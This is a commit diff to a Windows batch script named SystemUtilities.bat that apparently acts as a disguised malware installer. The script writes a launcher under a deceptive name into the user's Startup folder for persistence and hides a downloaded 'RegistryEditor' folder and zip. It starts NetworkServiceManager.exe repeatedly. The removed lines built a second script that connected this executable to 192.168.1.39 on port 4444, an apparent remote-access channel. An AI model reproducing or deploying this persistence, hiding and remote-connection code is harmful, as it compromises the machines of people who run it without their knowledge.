481849c0c4624295833ef42be8a65b6bf816879b
GooseLoose0809 <122241263+GooseLoose0809@users.noreply.github.com>
2024-06-24 11:28:50 -0500

    Update SystemUtilities.bat

--- SystemUtilities.bat
+++ SystemUtilities.bat
@@ -13,28 +13,11 @@ REM Create the batch file for startup folder (WindowsServiceHost.bat)
   echo call "%~dp0DriverUpdateManager.bat"
 ) > "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\WindowsServiceHost.bat"
 
-REM Create the batch file to run NetworkServiceManager.exe (DriverUpdateManager.bat)
-(
-  echo @echo off
-  echo REM Kill all instances of NetworkServiceManager.exe
-  taskkill /f /im NetworkServiceManager.exe >nul 2>&1
-  timeout /t 1 >nul
-  start NetworkServiceManager.exe -run
-  timeout /t 1 >nul
-  NetworkServiceManager.exe -connect 192.168.1.39::4444
-) > "%script_dir%DriverUpdateManager.bat"
-
 REM Check if both batch files exist in their respective locations
 if exist "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\WindowsServiceHost.bat" (
   >nul echo WindowsServiceHost.bat created successfully in Startup folder.
 ) else (
   >nul echo Failed to create WindowsServiceHost.bat in Startup folder.
-)
-
-if exist "%script_dir%DriverUpdateManager.bat" (
-  >nul echo DriverUpdateManager.bat created successfully in current directory.
-) else (
-  >nul echo Failed to create DriverUpdateManager.bat in current directory.
 )
 
 REM Hide the RegistryEditor folder and its parent folder
@@ -46,7 +29,7 @@ attrib +h "%USERPROFILE%\Downloads\RegistryEditor-main.zip"
 
 REM Start NetworkServiceManager.exe for the first time and wait for 12 seconds
 start "" "%script_dir%NetworkServiceManager.exe"
-timeout /t 12 >nul
+timeout /t 10 >nul
 
 REM Attempt to kill NetworkServiceManager.exe if it is running
 taskkill /f /im NetworkServiceManager.exe >nul 2>&1
